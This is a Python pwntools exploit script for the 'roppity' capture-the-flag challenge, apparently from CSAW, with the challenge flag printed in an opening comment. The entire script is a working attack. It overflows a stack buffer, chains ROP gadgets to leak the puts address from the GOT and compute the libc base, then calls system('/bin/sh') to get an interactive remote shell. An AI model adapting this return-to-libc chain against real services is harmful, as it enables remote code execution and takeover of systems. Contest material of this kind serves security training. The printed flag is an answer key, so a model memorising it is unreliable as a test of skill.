#exploit for roppity
#flag{r0p_4ft3r_r0p_4ft3R_r0p}
from pwn import *
elf = ELF("./rop")
libc = ELF("./libc-2.27.so")
context.binary=elf
target=remote('pwn.chal.csaw.io',5016)

def sla(string,val):
	target.sendlineafter(string,val)

def attack(payload):
	sla("Hello\n","A"*0x28+payload)
main=0x4005DC
payload=p64(elf.plt["puts"])+p64(main)+p64(elf.got["puts"])
attack(payload)
libc_puts=u64(("\x30"+target.recv(5)).ljust(8,"\x00"))
libc_base=libc_puts-libc.sym["puts"]
libc_system=libc_base+libc.sym["system"]
libc_binsh=libc_base+libc.search("/bin/sh\x00").next()
poprdi=0x0000000000400683
ret=0x000000000040048e
payload=p64(ret)+p64(poprdi)+p64(libc_binsh)+p64(libc_system)
attack(payload)
target.interactive()
